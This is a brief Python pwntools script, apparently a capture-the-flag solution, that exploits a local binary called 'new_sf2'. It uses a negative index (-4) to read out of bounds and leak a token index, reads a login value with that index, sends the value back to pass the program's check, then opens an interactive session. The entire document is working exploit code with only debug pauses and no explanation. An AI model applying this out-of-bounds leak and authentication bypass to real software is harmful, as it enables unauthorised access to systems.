from pwn import *

p = process("./new_sf2")

p.sendline('1')
p.sendline('-4')
p.recvuntil("Value : ")
token_idx = u32(p.recv(4))
print(token_idx)
input("stop0")

p.sendline('1')
p.sendline(str(token_idx))
p.recvuntil("Value : ")
login = u32(p.recv(4))

print(login)
input("stop1")

p.sendline('2')
p.sendline(p32(login))

p.sendline('3')

p.interactive()
